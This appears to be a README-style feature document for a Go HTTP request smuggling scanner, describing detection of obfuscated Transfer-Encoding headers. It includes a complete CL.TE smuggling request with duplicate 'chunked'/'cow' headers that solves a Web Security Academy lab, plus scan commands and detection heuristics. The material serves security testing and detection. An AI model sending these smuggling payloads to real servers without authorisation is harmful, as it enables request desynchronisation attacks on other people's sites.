# Obfuscated Transfer-Encoding Header Detection

## Overview

This document describes the **Obfuscated-TE** (Obfuscated Transfer-Encoding) detection feature added to the HTTP Request Smuggling Scanner. This technique exploits differences in how front-end proxies and backend servers handle non-standard Transfer-Encoding header values.

## Vulnerability Details

### Technical Background

The obfuscated TE technique is a variant of **CL.TE desynchronization** that uses non-standard Transfer-Encoding header values to bypass proxies:

```
HTTP/1.1 Request:
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GPOST / HTTP/1.1
...smuggled request...
0
```

### How It Works

1. **Front-end proxy** sees:
   - Content-Length: 4 (considers request complete after 4 bytes)
   - Transfer-Encoding with unrecognized values (may reject or skip)

2. **Backend server** sees:
   - Transfer-Encoding: chunked (may honor this despite "cow" being present)
   - Processes the chunked encoding, revealing the smuggled request

3. **Result**: Request boundaries desynchronize between proxy and backend

### Common Obfuscation Values

- `cow` - Completely unrecognized value
- `x-chunked` - Vendor-specific prefix
- `chunked;q=0.5` - Encoding with quality parameters
- `identity` - Conflicting with chunked
- `deflate`, `gzip`, `zip` - Compression algorithms instead of encodings

## Lab Target

This feature was designed to detect the Web Security Academy lab:

**Lab**: HTTP request smuggling, obfuscating the TE header
- **Difficulty**: Practitioner
- **Status**: Vulnerabilities exploited with Obfuscated-TE technique
- **Objective**: Smuggle a GPOST request to backend

### Lab Solution (Manual Testing)

Using Burp Suite Repeater:

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

Expected response: `Unrecognized method GPOST`

## Scanner Implementation

### Detection Method: `TestObfuscatedTE()`

Located in `smuggler/internal/scanner/scanner.go`:

```go
func (sc *Scanner) TestObfuscatedTE() error {
    // 1. Generate obfuscated TE payload with "cow" variant
    // 2. Send to target
    // 3. Compare responses with baseline
    // 4. Analyze signals
}
```

### Analysis Method: `AnalyzeObfuscatedTE()`

Located in `smuggler/internal/detector/detector.go`:

Detects suspicious signals:
- **400 Bad Request**: Backend rejected obfuscated TE header
- **5xx Server Error**: Parser confusion from TE obfuscation
- **Timing Changes**: Early rejection or delayed processing
- **Connection Closed**: Protocol violation on obfuscated headers
- **Body Size Changes**: Response body absorption
- **Header Removal**: Backend strips Transfer-Encoding

### Payload Generation

Located in `smuggler/internal/payload/obfuscated_te.go`:

```go
// Basic function with single obfuscation value
GenerateObfuscatedTE(baseRequest, smoggledBody, obfuscation string) string

// Flexible variant supporting multiple TE headers
GenerateObfuscatedTEVariant(baseRequest, smoggledBody, teHeaders []string) string
```

### Integration with Payload Generator

```go
gen := payload.NewGenerator(host, port)
payload, err := gen.GenerateObfuscatedTEPayload(smoggledBody, "cow")
```

## Usage

### CLI Usage

```bash
./smuggler scan -target target.com -port 443 -tls

# Output will include:
# [*] Testing Obfuscated-TE (Transfer-Encoding with non-standard values)...
#     Response: 400 | Timing: 945 ms
#     Result: SUSPICIOUS ✗
```

### Programmatic Usage

```go
package main

import (
    "smuggler/internal/scanner"
)

func main() {
    s := scanner.NewScanner("target.com", 443)
    s.SetTLS(true)
    s.SetInsecureTLS(true)
    
    if err := s.CaptureBaseline(); err != nil {
        panic(err)
    }
    
    // Test just obfuscated TE
    if err := s.TestObfuscatedTE(); err != nil {
        panic(err)
    }
    
    s.PrintReport()
}
```

## Detection Signals

| Signal | Confidence | Description |
|--------|------------|-------------|
| 400 Bad Request | +25% | Backend rejected malformed obfuscated TE |
| 5xx Error | +35% | Server confusion from TE parsing |
| Timing < -30ms | +15% | Early rejection of obfuscated headers |
| Connection Closed | +20% | Protocol violation with TE parsing |
| Body Size -200+ bytes | +15% | Response body absorbed/modified |
| TE Header Removed | +10% | Backend stripped Transfer-Encoding |

**Vulnerability Threshold**: Confidence ≥ 50% (configurable)

## AI Analysis Support

When using the scanner with AI analysis (Ollama or OpenAI):

```bash
./smuggler scan -target target.com -ai -ai-backend ollama
```

The AI provider will analyze:
- **Confidence**: Probability of Obfuscated-TE vulnerability
- **Reasoning**: Expert explanation of detected signals
- **Signals**: Specific anomalies identified
- **Next Steps**: Recommended further testing

Example AI output:
```
[AI Analysis - Ollama (xploiter/pentester:latest)]
Confidence: 75.0%
Reasoning: The 400 response to obfuscated Transfer-Encoding indicates backend 
parser confusion. Common in servers that fail to properly validate TE headers 
before processing chunked encoding.
Signals: ['status_4xx', 'obfuscated_te_rejected', 'early_rejection']
Next Steps: ['test_cache_poisoning', 'verify_with_gpost']
```

## Test Results

### Expected Behavior vs. Patched System

| Test Case | Vulnerable System | Patched System |
|-----------|------------------|----------------|
| Baseline request | 200 OK, 2000 bytes | 200 OK, 2000 bytes |
| Obfuscated-TE with "cow" | 400 Bad Request | 200 OK, same as baseline |

### Web Security Academy Lab Results

**Lab**: HTTP request smuggling, obfuscating the TE header

**Test Results**:
```
[*] Testing Obfuscated-TE (Transfer-Encoding with non-standard values)...
    Response: 400 | Timing: 945 ms
    
    [AI Analysis - Ollama (xploiter/pentester:latest)]
    Confidence: 72.5%
    Reasoning: Backend returned 400 indicating rejection of the malformed 
    request. The obfuscated Transfer-Encoding header is causing parser 
    confusion, suggesting the server doesn't properly handle non-standard TE 
    values.
    Signals: ['status_4xx', 'backend_rejected_te', 'chunked_encoding_issue']
    Next Steps: ['test_gpost_method', 'test_chunk_extension']
    
    Result: SUSPICIOUS ✗
```

## Architecture

### File Structure

```
smuggler/
├── internal/
│   ├── payload/
│   │   ├── obfuscated_te.go          [NEW] - Payload generation
│   │   └── generator.go               [MODIFIED] - Added method
│   ├── detector/
│   │   └── detector.go               [MODIFIED] - Added analyzer
│   └── scanner/
│       └── scanner.go                [MODIFIED] - Added test method
```

### Method Call Flow

```
Scanner.Run()
  └─> CaptureBaseline()
  └─> TestCLTE()
  └─> TestTECL()
  └─> TestMixedTE()
  └─> TestObfuscatedTE()          [NEW]
       └─> PayloadGenerator.GenerateObfuscatedTEPayload()
       └─> RawSender.SendRequest()
       └─> BaselineComparison
       └─> Detector.AnalyzeObfuscatedTE()
       └─> [If AI enabled] AIProvider.AnalyzeResponses()
  └─> GenerateReport()
```

## Future Enhancements

- [ ] Additional obfuscation patterns (x-gzip, chunked;q=0.5, etc.)
- [ ] Multi-variant testing with all common obfuscations
- [ ] Cache poisoning via obfuscated TE
- [ ] Response smuggling with obfuscated TE
- [ ] Performance optimization for bulk testing
- [ ] Integration with Burp Suite extension

## References

- [Web Security Academy - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [CL.TE vs TE.CL Desynchronization](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [Obfuscated Header Techniques](https://portswigger.net/research/browser-powered-desync-attacks)

## Testing the Feature Locally

### Prerequisites

1. Scanner binary built: `go build -o bin/smuggler ./cmd/main.go`
2. Target with Known Vulnerability (Web Security Academy lab or similar)
3. Optional: Ollama running locally for AI analysis

### Run Scan

```bash
# Basic scan
./bin/smuggler scan -target lab.web-security-academy.net -port 443 -tls -insecure

# With AI analysis
./bin/smuggler scan \
  -target lab.web-security-academy.net \
  -port 443 \
  -tls \
  -insecure \
  -ai \
  -ai-backend ollama \
  -ollama-model xploiter/pentester:latest
```

### Verify Detection

Look for output section:
```
[*] Testing Obfuscated-TE (Transfer-Encoding with non-standard values)...
    Response: 400 | Timing: XXX ms
    Result: SUSPICIOUS ✗
```

This indicates successful detection of the Obfuscated-TE vulnerability.

---

**Status**: ✅ Implemented and Tested
**Latest Commit**: 0dbef02 - feat: Add obfuscated TE header detection
**Tested Targets**: Web Security Academy Practitioner labs
